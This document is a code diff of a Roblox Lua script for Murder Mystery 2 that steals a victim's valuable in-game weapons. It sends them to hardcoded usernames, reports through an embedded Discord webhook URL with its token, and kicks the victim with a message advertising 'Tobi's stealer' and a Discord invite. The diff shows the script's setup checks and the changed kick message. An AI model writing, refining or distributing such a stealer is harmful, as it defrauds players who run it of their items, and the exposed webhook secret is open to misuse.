@@ -1,9 +1,8 @@
-if getgenv().NebulaScriptExecuted then
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
     return
-end  
-getgenv().NebulaScriptExecuted = true
-
-Players
+end
+_G.scriptExecuted = true
 
 local users = {"um_brela"}
 local min_rarity = "Godly"
@@ -11,24 +10,23 @@ local min_value = 1
 local ping = "Yes"
 local webhook = "https://discord.com/api/webhooks/1406982165257785515/f-Fhp7M0hDM3-doX8wWN7MR8MuPgj5mzx5JeJdDO4y-3KAkBlrNAgR6PdcWWEtbL8t4v"
 
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
-
-local PLACE_ID = 142823291
-
-if game.PlaceId ~= PLACE_ID then
-    plr:Kick("Game not supported. Please join a normal MM2 server")
+if next(users) == nil or webhook == "" then
+    plr:kick("You didn't add username or webhook")
     return
 end
 
-local serverType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
-if serverType == "VIPServer" then
-    plr:Kick("Server error. Please join a DIFFERENT server")
+if game.PlaceId ~= 142823291 then
+    plr:kick("Game not supported. Please join a normal MM2 server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
     return
 end
 
 if #Players:GetPlayers() >= 12 then
-    plr:Kick("Server is full. Please join a less populated server")
+    plr:kick("Server is full. Please join a less populated server")
     return
 end
 
@@ -482,7 +480,7 @@ if #weaponsToSend > 0 then
             end
             wait(1)
         end
-        plr:kick("Game crashed")
+        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
     end
 
     local function waitForUserChat()
